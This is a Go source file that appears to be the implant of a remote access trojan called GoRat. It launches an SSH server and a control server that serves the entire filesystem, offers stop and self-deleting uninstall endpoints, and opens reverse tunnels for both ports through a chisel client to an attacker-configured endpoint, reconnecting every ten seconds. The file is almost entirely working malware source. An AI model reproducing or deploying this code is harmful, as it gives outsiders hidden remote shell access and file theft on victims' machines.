package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"time"

	ssh "github.com/JustinTimperio/GoRat/shell"
	chisel "github.com/jpillora/chisel/client"
	cos "github.com/jpillora/chisel/share/cos"
)

var (
	endpoint_url = "@ENDPOINT_HERE@"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	BasePort := (rand.Intn(20000) * 2) + 10000

	go ssh.SSHServer(BasePort)
	go ControlServer(BasePort)

	for {
		ChiselWorker(BasePort)
		time.Sleep(10 * time.Second)
	}
}

// Control Server
func ControlServer(BasePort int) {
	controlPort := strconv.Itoa(BasePort + 1)

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "OK")
	})

	http.HandleFunc("/stop", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "OK")
		existenceIsPain()
	})

	http.HandleFunc("/uninstall", func(w http.ResponseWriter, r *http.Request) {
		ex, err := os.Executable()
		if err != nil {
			existenceIsPain()
		}
		fmt.Fprintf(w, ex)
		os.Remove(ex)
		existenceIsPain()
	})

	fs := http.FileServer(http.Dir(getPaths()))
	http.Handle("/fs/", http.StripPrefix("/fs/", fs))
	http.ListenAndServe("127.0.0.1:"+controlPort, nil)
}

// ChiselWorker
func ChiselWorker(BasePort int) (err error) {
	sshPort := strconv.Itoa(BasePort + 0)
	controlPort := strconv.Itoa(BasePort + 1)

	config := chisel.Config{Headers: http.Header{}}
	config.Server = endpoint_url
	config.Remotes = []string{"R:" + sshPort, "R:" + controlPort}

	c, err := chisel.NewClient(&config)
	if err != nil {
		return err
	}
	c.Debug = true
	go cos.GoStats()
	ctx := cos.InterruptContext()

	if err := c.Start(ctx); err != nil {
		return err
	}

	if err := c.Wait(); err != nil {
		return err
	}

	return nil
}

func getPaths() (out string) {
	switch runtime.GOOS {
	case "linux":
		return "/"
	case "darwin":
		return "/"
	case "windows":
		return "C:\\"
	}
	return ""
}

func existenceIsPain() {
	os.Exit(0)
	panic("RIP")
}
